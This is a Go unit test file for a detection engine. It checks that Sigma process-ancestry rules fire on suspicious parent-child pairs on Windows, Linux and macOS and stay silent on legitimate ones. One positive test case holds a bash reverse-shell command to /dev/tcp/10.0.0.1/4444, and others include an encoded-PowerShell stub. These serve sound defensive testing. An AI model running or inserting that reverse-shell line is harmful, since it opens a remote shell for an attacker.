package detection

import "testing"

// TestSystemProcessAncestryFire verifies the system-process ancestry anomaly rules fire on
// an anomalous parent→child pair (via the ParentImage alias from ppid resolution) and — the
// point of these rules — do NOT fire on the legitimate children of those system processes.
func TestSystemProcessAncestryFire(t *testing.T) {
	ev := NewSigmaEvaluator()
	LoadBuiltinRules(ev)

	fires := func(title string, event map[string]interface{}) bool {
		addPipelineSigmaAliases(event)
		for _, m := range ev.EvaluateEvent(event) {
			if m.RuleTitle == title {
				return true
			}
		}
		return false
	}

	proc := func(parent, image string) map[string]interface{} {
		return map[string]interface{}{
			"type":              "process",
			"parent_image_path": parent,
			"image_path":        image,
			"command_line":      image,
		}
	}

	// ── Positive: anomalous children ─────────────────────────────────────
	pos := []struct {
		title, parent, image string
	}{
		{"LSASS Spawning Anomalous Child Process", `C:\Windows\System32\lsass.exe`, `C:\Users\Public\evil.exe`},
		{"LSASS Spawning Anomalous Child Process", `C:\Windows\System32\lsass.exe`, `C:\Windows\System32\cmd.exe`},
		{"Winlogon Spawning Command Shell", `C:\Windows\System32\winlogon.exe`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
		{"Service Control Manager Spawning Shell or LOLBin", `C:\Windows\System32\services.exe`, `C:\Windows\System32\cmd.exe`},
	}
	for _, tc := range pos {
		if !fires(tc.title, proc(tc.parent, tc.image)) {
			t.Errorf("rule %q did not fire on %s → %s", tc.title, tc.parent, tc.image)
		}
	}

	// ── Negative: legitimate children of those system processes ──────────
	neg := []struct {
		title, parent, image string
	}{
		// LSASS spawning the WER crash handler is normal.
		{"LSASS Spawning Anomalous Child Process", `C:\Windows\System32\lsass.exe`, `C:\Windows\System32\WerFault.exe`},
		// Winlogon → userinit is the normal logon child.
		{"Winlogon Spawning Command Shell", `C:\Windows\System32\winlogon.exe`, `C:\Windows\System32\userinit.exe`},
		// services.exe → a service executable (svchost) is normal.
		{"Service Control Manager Spawning Shell or LOLBin", `C:\Windows\System32\services.exe`, `C:\Windows\System32\svchost.exe`},
	}
	for _, tc := range neg {
		if fires(tc.title, proc(tc.parent, tc.image)) {
			t.Errorf("rule %q should NOT fire on legitimate %s → %s", tc.title, tc.parent, tc.image)
		}
	}
}

// TestAncestryHollowingAndCrossPlatformFire covers svchost hollowing (Windows) and the
// Linux DB-daemon / macOS-Office ancestry rules — anomalous parent→child on each platform,
// with the legitimate-parent negatives that keep them low-FP.
func TestAncestryHollowingAndCrossPlatformFire(t *testing.T) {
	ev := NewSigmaEvaluator()
	LoadBuiltinRules(ev)

	fires := func(title string, event map[string]interface{}) bool {
		addPipelineSigmaAliases(event)
		for _, m := range ev.EvaluateEvent(event) {
			if m.RuleTitle == title {
				return true
			}
		}
		return false
	}
	proc := func(parent, image string) map[string]interface{} {
		return map[string]interface{}{"type": "process", "parent_image_path": parent, "image_path": image, "command_line": image}
	}

	pos := []struct{ title, parent, image string }{
		// svchost with an interactive parent (explorer) → hollowing.
		{"Svchost With Non-Standard Parent (Process Hollowing / Masquerade)", `C:\Windows\explorer.exe`, `C:\Windows\System32\svchost.exe`},
		// svchost parented by a user-path binary → hollowing.
		{"Svchost With Non-Standard Parent (Process Hollowing / Masquerade)", `C:\Users\v\AppData\Local\Temp\a.exe`, `C:\Windows\System32\svchost.exe`},
		// Linux DB daemon → shell (SQLi RCE).
		{"Database Daemon Spawning a Shell (Linux)", `/usr/sbin/mysqld`, `/bin/bash`},
		{"Database Daemon Spawning a Shell (Linux)", `/usr/lib/postgresql/16/bin/postgres`, `/usr/bin/python3`},
		// macOS Office → interpreter (macro drop).
		{"Office Application Spawning a Shell or Script Interpreter (macOS)", `/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word`, `/bin/bash`},
		{"Office Application Spawning a Shell or Script Interpreter (macOS)", `/Applications/Microsoft Excel.app/Contents/MacOS/Microsoft Excel`, `/usr/bin/osascript`},
	}
	for _, tc := range pos {
		if !fires(tc.title, proc(tc.parent, tc.image)) {
			t.Errorf("rule %q did not fire on %s → %s", tc.title, tc.parent, tc.image)
		}
	}

	neg := []struct{ title, parent, image string }{
		// svchost launched by services.exe (normal) → no fire.
		{"Svchost With Non-Standard Parent (Process Hollowing / Masquerade)", `C:\Windows\System32\services.exe`, `C:\Windows\System32\svchost.exe`},
		// svchost launched by another svchost (normal for some ops) → no fire.
		{"Svchost With Non-Standard Parent (Process Hollowing / Masquerade)", `C:\Windows\System32\svchost.exe`, `C:\Windows\System32\svchost.exe`},
		// DB daemon spawning a non-shell helper → no fire.
		{"Database Daemon Spawning a Shell (Linux)", `/usr/sbin/mysqld`, `/usr/bin/logger`},
		// Office spawning a non-interpreter (its updater) → no fire.
		{"Office Application Spawning a Shell or Script Interpreter (macOS)", `/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word`, `/usr/bin/open`},
	}
	for _, tc := range neg {
		if fires(tc.title, proc(tc.parent, tc.image)) {
			t.Errorf("rule %q should NOT fire on %s → %s", tc.title, tc.parent, tc.image)
		}
	}
}

// TestAncestryCompletionFire covers the second ancestry batch: spooler/smss/csrss (Windows),
// cron reverse-shell (Linux), and browser→shell (macOS).
func TestAncestryCompletionFire(t *testing.T) {
	ev := NewSigmaEvaluator()
	LoadBuiltinRules(ev)

	firesEvent := func(title string, event map[string]interface{}) bool {
		addPipelineSigmaAliases(event)
		for _, m := range ev.EvaluateEvent(event) {
			if m.RuleTitle == title {
				return true
			}
		}
		return false
	}
	// procCmd allows an explicit command line (needed for the cron reverse-shell gate).
	procCmd := func(parent, image, cmd string) map[string]interface{} {
		return map[string]interface{}{"type": "process", "parent_image_path": parent, "image_path": image, "command_line": cmd}
	}

	pos := []struct{ title, parent, image, cmd string }{
		{"Print Spooler Spawning Shell or LOLBin", `C:\Windows\System32\spoolsv.exe`, `C:\Windows\System32\cmd.exe`, `cmd.exe /c whoami`},
		{"Session Manager or CSRSS Spawning Anomalous Child", `C:\Windows\System32\csrss.exe`, `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `powershell -enc ...`},
		{"Session Manager or CSRSS Spawning Anomalous Child", `C:\Windows\System32\smss.exe`, `C:\Windows\System32\cmd.exe`, `cmd.exe`},
		{"Cron or At Job Spawning a Reverse Shell (Linux)", `/usr/sbin/cron`, `/bin/bash`, `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`},
		{"Web Browser Spawning a Shell or Interpreter (macOS)", `/Applications/Safari.app/Contents/MacOS/Safari`, `/bin/zsh`, `zsh`},
	}
	for _, tc := range pos {
		if !firesEvent(tc.title, procCmd(tc.parent, tc.image, tc.cmd)) {
			t.Errorf("rule %q did not fire on %s → %s (%s)", tc.title, tc.parent, tc.image, tc.cmd)
		}
	}

	neg := []struct{ title, parent, image, cmd string }{
		// Spooler spawning a legit driver host is not a shell/LOLBin → no fire.
		{"Print Spooler Spawning Shell or LOLBin", `C:\Windows\System32\spoolsv.exe`, `C:\Windows\System32\PrintIsolationHost.exe`, `PrintIsolationHost.exe`},
		// smss spawning the normal csrss child → no fire.
		{"Session Manager or CSRSS Spawning Anomalous Child", `C:\Windows\System32\smss.exe`, `C:\Windows\System32\csrss.exe`, `csrss.exe`},
		// cron running a benign maintenance job (no reverse-shell pattern) → no fire.
		{"Cron or At Job Spawning a Reverse Shell (Linux)", `/usr/sbin/cron`, `/bin/bash`, `bash /opt/backup/nightly.sh`},
		// Browser spawning its sandboxed helper → no fire.
		{"Web Browser Spawning a Shell or Interpreter (macOS)", `/Applications/Safari.app/Contents/MacOS/Safari`, `/Applications/Safari.app/Contents/XPCServices/com.apple.Safari.SandboxBroker`, `SandboxBroker`},
	}
	for _, tc := range neg {
		if firesEvent(tc.title, procCmd(tc.parent, tc.image, tc.cmd)) {
			t.Errorf("rule %q should NOT fire on %s → %s (%s)", tc.title, tc.parent, tc.image, tc.cmd)
		}
	}
}
